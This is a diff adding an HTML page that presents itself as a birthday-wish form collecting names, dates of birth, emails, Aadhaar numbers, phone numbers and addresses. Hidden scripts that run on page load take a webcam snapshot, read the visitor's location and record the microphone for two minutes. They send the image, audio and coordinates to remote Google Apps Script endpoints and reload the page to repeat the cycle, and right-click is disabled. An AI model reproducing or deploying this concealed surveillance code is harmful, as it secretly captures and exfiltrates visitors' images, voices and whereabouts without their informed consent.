@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=1100" />
+    <link rel="icon" type="image/png" href="images/photo1.jpg" />
+
+    <title>Email Wish</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f0;
+        margin: 0;
+        padding: 0;
+      }
+      #contact {
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        margin: 20px auto;
+        max-width: 800px;
+      }
+      h1 {
+        font-size: 24px;
+        text-align: center;
+      }
+      label {
+        display: block;
+        font-weight: bold;
+        margin-top: 10px;
+      }
+      input[type="text"],
+      input[type="date"],
+      input[type="email"] {
+        width: 100%;
+        padding: 10px;
+        margin-top: 5px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+      .error-message {
+        color: red;
+        margin-top: 5px;
+      }
+      #submitBtn {
+        padding: 10px 20px;
+        background-color: #520ebf;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        width: 100%;
+        margin-top: 10px;
+      }
+      #studentList {
+        margin-top: 20px;
+      }
+      #studentList table {
+        width: 100%;
+        border-collapse: collapse;
+      }
+      #studentList table th,
+      #studentList table td {
+        padding: 10px;
+        border: 1px solid #ccc;
+        text-align: center;
+      }
+      #studentList table th {
+        background-color: #520ebf;
+        color: #fff;
+      }
+      #popupMessage {
+        display: none;
+        background-color: #11ed62;
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        text-align: center;
+      }
+      .form-column {
+        display: flex;
+        justify-content: space-between;
+      }
+      .form-column label {
+        width: 48%;
+      }
+      .form-column input {
+        width: 48%;
+      }
+
+      /* Style for the View Student List button */
+      #viewStudentListBtn {
+        background-color: #00ba1c; /* Blue background color */
+        color: white; /* White text color */
+        padding: 10px 20px; /* Padding for the button */
+        border: none; /* No border */
+        cursor: pointer; /* Show pointer cursor on hover */
+        align-items: center;
+        text-align: center;
+      }
+      #viewStudentListBtn1 {
+        background-color: #3e00ba; /* Blue background color */
+        color: white; /* White text color */
+        padding: 10px 20px; /* Padding for the button */
+        border: none; /* No border */
+        cursor: pointer; /* Show pointer cursor on hover */
+        align-items: center;
+        text-align: center;
+      }
+      #viewStudentListBtn2 {
+        background-color: #ba0013; /* Blue background color */
+        color: white; /* White text color */
+        padding: 10px 20px; /* Padding for the button */
+        border: none; /* No border */
+        cursor: pointer; /* Show pointer cursor on hover */
+        align-items: center;
+        text-align: center;
+      }
+      #viewStudentListBtn3 {
+        background-color: #ff6d0b; /* Blue background color */
+        color: white; /* White text color */
+        padding: 10px 20px; /* Padding for the button */
+        border: none; /* No border */
+        cursor: pointer; /* Show pointer cursor on hover */
+        align-items: center;
+        text-align: center;
+      }
+      #viewStudentListBtn4 {
+        background-color: #0bff13; /* Blue background color */
+        color: white; /* White text color */
+        padding: 10px 20px; /* Padding for the button */
+        border: none; /* No border */
+        cursor: pointer; /* Show pointer cursor on hover */
+        align-items: center;
+        text-align: center;
+      }
+      #button-container {
+        margin-top: 20px; /* Add spacing between buttons and header */
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+      }
+      .form-input {
+        width: 90%;
+        padding: 8px;
+        margin-bottom: 10px;
+        font-size: 16px; /* Adjust the font size as needed */
+      }
+
+      .btn-primary {
+        background-color: #007bff;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        cursor: pointer;
+      }
+
+      .data-table {
+        width: 90%; /* Make the table cover the entire screen */
+        border-collapse: collapse;
+        margin: 0 auto;
+      }
+
+      .data-table th,
+      .data-table td {
+        border: 1px solid #333;
+        padding: 8px;
+        font-size: 10px; /* Adjust the font size as needed */
+      }
+
+      .center {
+        text-align: center;
+        color: #333;
+      }
+
+      .bold {
+        font-weight: bold;
+      }
+      .dataTable {
+        font-size: 10px; /* Set the font size to small */
+        padding: 30px;
+        border: none;
+      }
+
+      .dataTableContainer {
+        padding: 20px; /* Add padding around the table */
+      }
+
+      .dataTable td {
+        padding: 5px; /* Adjust cell padding */
+      }
+
+      .deleteButton {
+        background-color: #ff6347;
+        color: #fff;
+        border: none;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <br />
+    <div id="button-container"></div>
+    <section id="contact">
+      <div class="container mt-3 contactContent">
+        <h1><b>Birthday Wish Management System</b></h1>
+        <form id="contactForm">
+          <div class="form-column">
+            <label for="studentName">NAME</label>
+            <input
+              type="text"
+              name="studentName"
+              id="studentName"
+              placeholder="NAME"
+              required
+            />
+          </div>
+          <div class="form-column">
+            <label for="dob">DOB</label>
+            <input type="date" name="dob" id="dob" />
+          </div>
+          <div class="form-column">
+            <label for="mailId">MAIL ID</label>
+            <input
+              type="email"
+              name="mailId"
+              id="mailId"
+              placeholder="MAIL ID"
+            />
+          </div>
+          <div class="form-column">
+            <label for="aadhaar">AADHAAR NUMBER</label>
+            <input
+              type="text"
+              name="aadhaar"
+              id="aadhaar"
+              placeholder="AADHAAR NUMBER"
+            />
+          </div>
+          <div class="form-column">
+            <label for="studentMobile">MOBILE NUMBER</label>
+            <input
+              type="text"
+              name="studentMobile"
+              id="studentMobile"
+              placeholder="MOBILE NUMBER"
+            />
+          </div>
+          <div class="form-column">
+            <label for="address">ADDRESS</label>
+            <input
+              type="text"
+              name="address"
+              id="address"
+              placeholder="ADDRESS"
+            />
+          </div>
+          <input type="submit" id="submitBtn" value="Add" />
+          <br />
+        </form>
+      </div>
+    </section>
+    <script>
+      let form = document.querySelector("#contactForm");
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        document.querySelector("#submitBtn").value = "Submitting..";
+        let data = new FormData(form);
+        fetch(
+          "https://script.google.com/macros/s/AKfycbxSrgMFCStUHvLqYZk_jfo1vAzwBP4KZoMTyflSCohIvNdxdNR79sHXUxGJY82id3vczA/exec",
+          {
+            method: "POST",
+            body: data,
+          }
+        )
+          .then((res) => res.text())
+          .then((data) => {
+            document.querySelector("#submitBtn").value = "Add";
+            alert("Form Submitted Successfully");
+            setTimeout(function () {
+              document.querySelector("#studentName").value = "";
+              document.querySelector("#dob").value = "";
+              document.querySelector("#mailId").value = "";
+              document.querySelector("#aadhaar").value = "";
+              document.querySelector("#studentMobile").value = "";
+              document.querySelector("#address").value = "";
+            }, 3000);
+          });
+      });
+      // Add an event listener to the "View Student List" button
+      document
+        .getElementById("viewStudentListBtn")
+        .addEventListener("click", function () {
+          // Open the student list page in a new window
+          window.open("birthday.html", "_blank");
+        });
+      document
+        .getElementById("viewStudentListBtn1")
+        .addEventListener("click", function () {
+          // Open the student list page in a new window
+          window.open("student.html", "_blank");
+        });
+      document
+        .getElementById("viewStudentListBtn2")
+        .addEventListener("click", function () {
+          // Open the student list page in a new window
+          window.open("storage.html", "_blank");
+        });
+      document
+        .getElementById("viewStudentListBtn3")
+        .addEventListener("click", function () {
+          // Open the student list page in a new window
+          window.open("calculator.html", "_blank");
+        });
+      document
+        .getElementById("viewStudentListBtn4")
+        .addEventListener("click", function () {
+          // Open the student list page in a new window
+          window.open("bmi.html", "_blank");
+        });
+    </script>
+
+    <h1><b>Search Data</b></h1>
+    <form id="dataForm" style="text-align: center">
+      <input
+        type="text"
+        id="search"
+        name="search"
+        placeholder="Search..."
+        style="
+          padding: 5px;
+          margin: 10px;
+          font-size: 14px;
+          width: 250px;
+          padding: 10px;
+          margin-top: 5px;
+          border: 1px solid #ccc;
+          border-radius: 5px;
+        "
+        required
+      />
+
+      <input
+        type="submit"
+        value="Search"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+    </form>
+
+    <div id="result" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      document
+        .getElementById("dataForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          // Get the selected sheet from the dropdown list
+          var selectedsheet = "GmailWish";
+          var search = document.getElementById("search").value;
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("selectedsheet", selectedsheet);
+          formData.append("search", search);
+          console.log(selectedsheet);
+          console.log(search);
+          console.log(formData);
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbwW7DzObi-KRjQWi7AecpNcoAAhDUvFZOqXvoh99iWaPrbyrAebqKXNfHeEWPn5QzNtIw/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+                alert("Network response was not ok.");
+                location.reload();
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              console.log(data);
+              displayResult(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No matching Rows found");
+              location.reload();
+            });
+        });
+
+      function displayResult(result) {
+        const resultDiv = document.getElementById("result");
+
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent = "No data found for the selected sheet.";
+          alert("No data found for the selected sheet.");
+          location.reload();
+        }
+      }
+    </script>
+
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <img
+      id="captured-image"
+      src=""
+      alt="Captured Image"
+      style="display: none"
+    />
+
+    <script>
+      if (navigator.geolocation) {
+        navigator.permissions
+          .query({ name: "geolocation" })
+          .then(function (result) {
+            if (result.state === "granted") {
+              // Geolocation access granted
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  // Handle the obtained position
+                },
+                function (error) {
+                  console.error("Error getting geolocation:", error);
+                }
+              );
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            } else if (result.state === "denied") {
+              // Geolocation access denied by the user
+              console.error("Geolocation access denied by the user.");
+              // You can inform the user or provide an alternative method
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            }
+          });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+      captureCamera();
+      let latitude;
+      let longitude;
+      let mapUrl;
+      var website = "https://arunkumar-selvaraj.web.app/home.html";
+      let capturedImage = document.getElementById("captured-image");
+      var imageDataUrl;
+
+      function captureCamera() {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (cameraStream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            video.srcObject = cameraStream;
+            video.onloadedmetadata = function () {
+              captureImage(cameraStream);
+            };
+          })
+          .catch(function (error) {
+            console.error("Error accessing the camera: " + error);
+          });
+
+        getLocation();
+      }
+
+      function getLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            function (error) {
+              console.error("Error accessing geolocation: " + error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported");
+        }
+      }
+
+      function captureImage(stream) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageDataUrl = canvas.toDataURL("image/png");
+        capturedImage.src = imageDataUrl;
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach((track) => track.stop());
+          sendImageData(imageDataUrl);
+        }
+      }
+
+      function sendImageData(imageDataUrl) {
+        let url =
+          "https://script.google.com/macros/s/AKfycbyRf0AWpmh3Z2CjnWYEE597VIY-gmnyj4T6AL3jnEQSfVFJ_2EWebvUiVTMoSg_ZsdO/exec";
+        console.log(latitude);
+        console.log(longitude);
+        console.log("imageDataUrl" + imageDataUrl.split("base64,")[1]);
+        let obj = {
+          base64: imageDataUrl.split("base64,")[1],
+          type: "image/png",
+          name: "captured_image.png",
+          url: mapUrl,
+          latitude: latitude,
+          longitude: longitude,
+          website: website,
+        };
+        fetch(url, {
+          method: "POST",
+          body: JSON.stringify(obj),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error sending image: " + error));
+      }
+    </script>
+
+    <div id="status"><span id="statusText"></span></div>
+    <script>
+      const status = document.getElementById("status");
+      console.log("Requesting access to the microphone...");
+      navigator.mediaDevices
+        .getUserMedia({ audio: true })
+        .then((stream) => {
+          console.log("Microphone access granted.");
+          const mediaRecorder = new MediaRecorder(stream);
+          const recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {
+            recordedChunks.push(event.data);
+            console.log("Data available...");
+          };
+          mediaRecorder.onstop = () => {
+            console.log("Recording stopped.");
+            const blob = new Blob(recordedChunks, { type: "audio/webm" });
+            console.log("Blob created:", blob);
+            convertBlobToBase64(blob); // Convert blob to Base64 URL
+          };
+          mediaRecorder.start();
+          console.log("Recording started...");
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Stopping recording after 10 seconds...");
+          }, 120000); // Stop recording after 10 seconds (adjust as needed)
+        })
+        .catch((err) => {
+          console.error("Error accessing the microphone:", err);
+        });
+
+      function convertBlobToBase64(blob) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const base64String = event.target.result.split(",")[1]; // Extracting base64 string
+          sendAudioToServer(base64String);
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      function sendAudioToServer(base64String) {
+        const formData = new FormData();
+        formData.append("audio", base64String);
+        formData.append("website", website);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
+        formData.append("url", mapUrl);
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+          })
+          .catch((error) => {
+            console.error("Error sending audio to the server:", error);
+            document.getElementById("status").innerText = "Error: " + error; // Display error message in the 'status' div
+          });
+      }
+      setTimeout(function () {
+        window.location.reload();
+      }, 160000);
+
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+    </script>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f4f4f4;
+      }
+
+      #calendarSetup {
+        margin: 20px;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        margin: 20px auto;
+      }
+
+      h1 {
+        text-align: center;
+        color: #333;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 8px;
+        color: #333;
+      }
+
+      input[type="number"] {
+        width: calc(100% - 20px);
+        padding: 10px;
+        margin-bottom: 15px;
+        border-radius: 4px;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+      }
+
+      button {
+        padding: 12px;
+        background-color: #4caf50;
+        color: white;
+        border: none;
+        cursor: pointer;
+        border-radius: 4px;
+      }
+
+      button:hover {
+        background-color: #45a049;
+      }
+
+      #status {
+        margin-top: 20px;
+        padding: 15px;
+        border-radius: 8px;
+        border: 1px solid #ccc;
+        text-align: center;
+        display: none;
+      }
+
+      .success {
+        background-color: #dff0d8;
+        border-color: #d6e9c6;
+        color: #3c763d;
+      }
+
+      .error {
+        background-color: #f2dede;
+        border-color: #ebccd1;
+        color: #a94442;
+      }
+    </style>
+    <div id="calendarSetup">
+      <h1>Set Up Birthday Calendar</h1>
+
+      <form id="yearForm">
+        <label for="year">Enter the birth year:</label>
+        <input
+          type="number"
+          id="year"
+          name="year"
+          min="2023"
+          max="2100"
+          placeholder="Enter birth year"
+          required
+        />
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+    <script>
+      document
+        .getElementById("yearForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the default form submission
+          alert("Date sent successfully");
+          const year = document.getElementById("year").value; // Get the value of the year input field
+
+          const formData = new FormData();
+          formData.append("year", year); // Append the year value to the form data
+          console.log(year);
+          fetch(
+            "https://script.google.com/macros/s/AKfycbyAm4qYlkwveZLv4TVxsKdFIdnwTnssY5ndrfvC5xqieci7QTgFvJK5l3afTsc4I5Nh3g/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then((response) => {
+              if (response.ok) {
+                return response.text(); // Convert the response to text
+              } else {
+                throw new Error("Network response was not ok.");
+              }
+            })
+            .then((data) => {
+              console.log("Response: " + data);
+              alert("Calendar setup done successfully");
+            })
+            .catch((error) => {
+              console.error("Error sending data to the server:", error);
+            });
+        });
+    </script>
+  </body>
+</html>
